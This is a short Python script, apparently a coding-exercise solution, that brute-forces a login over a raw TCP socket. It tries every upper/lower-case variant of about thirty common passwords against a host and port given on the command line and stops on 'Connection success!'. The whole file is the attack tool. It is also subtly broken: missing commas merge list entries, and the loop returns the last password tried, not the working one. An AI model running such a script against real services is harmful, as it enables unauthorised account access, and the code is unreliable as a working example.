# write your code here
import argparse
import sys
import socket
import itertools
import os

#parser = argparse.ArgumentParser(description="hacking website passwords")

#parser.add_argument("addrress")
#parser.add_argument("port")
#parser.add_argument("password")

args = sys.argv

ipaddress = args[1]
port = int(args[2])


def make_connection(ipaddress, port):
    passwords = [
        'chance', 'frankie', 'killer', 'forest', 'penguin'
        'jackson', 'rangers', 'monica', 'qweasdzxc', 'explorer'
        'gabriel', 'chelsea', 'simpsons', 'duncan', 'valentin',
        'classic', 'titanic', 'logitech', 'fantasy', 'scotland',
        'pamela', 'christin', 'birdie', 'benjamin', 'jonathan',
        'knight', 'morgan', 'melissa', 'darkness', 'cassie'
    ]
    with socket.socket() as c_socket:
        response = ''
        c_socket.connect((ipaddress, port))
        for s in passwords:
            pass_list = list(map(''.join, itertools.product(*zip(s.upper(), s.lower()))))
            for password in pass_list:
                e_password = password.encode()
                c_socket.send(e_password)
                e_response = c_socket.recv(1024)
                response = e_response.decode()
                if response == 'Connection success!':
                    break
    return password


response = make_connection(ipaddress, port)
print(response)


